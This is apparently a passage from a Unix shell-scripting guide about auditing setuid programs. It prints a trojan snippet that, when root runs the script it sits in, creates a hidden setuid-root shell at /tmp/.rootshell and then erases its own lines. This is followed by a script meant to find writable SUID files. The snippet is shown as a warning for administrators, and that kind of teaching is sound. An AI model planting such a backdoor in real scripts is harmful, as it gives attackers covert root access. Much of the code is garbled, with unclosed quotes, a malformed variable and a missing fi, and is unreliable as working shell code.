  md: '# #49 Tracking User ID Applications


    There are quite a few ways that ruffians and digital delinquents can break into
    a Unix system, whether they have an account or not, but few ways are as easy for
    them as finding an improperly protected or setgid command.

    In a shell script, adding a few lines of code can create setuid for the shell
    once the code is invoked by the unsuspecting root user:


    ```

    if [ "$USER-LOGNAME" = "root" ]; then # REMOVE

    cp /bin/sh /tmp/.rootshell # REMOVE

    chown root /tmp/.rootshell # REMOVE

    chmod -f 4777 /tmp/.rootshell # REMOVE

    grep -v # REMOVE " > /tmp/junk # REMOVE

    mv /tmp/junk $0 # REMOVE

    fi

    ```


    Once this script is run by root, it is surreptitiously copied into /tmp/.rootshell
    and made setuid root for the cracker to exploit at. Then the script itself be
    rewritten to remove the conditional code (hence the # REMOVE at the end of each
    line), leaving essentially no trace of the cracker.

    The code just shown should also be exploitable in any script or command that runs
    with an effective user ID of root; hence the critical need to ensure that you
    know and approve of all setuid root commands on your system. Of course should
    never have scripts with any sort of setuid or setgid permission for this reason,
    but it''s still smart to keep an eye on things.


    # The Code


    ```

    #!/bin/sh


    # find - Checks all SUID files or programs to see if they''re writeable,

    # and outputs the matches in a friendly and useful format.


    mtime=" # how far back (in days) to check for modified cmds

    verbose=0 # by default, let''s be quiet about


    if [ "$1" = "-v" ]; then

    verbose=1

    fi


    for match in $(find / -type f -perm +4000 -print)

    do

    if [ -x $match ]; then


    owner="$ls -ld $match | awk ''{print $3}''")

    perms="$(ls -ld $match | cut -c5-10 | grep ''w'')"

    done

    ```'
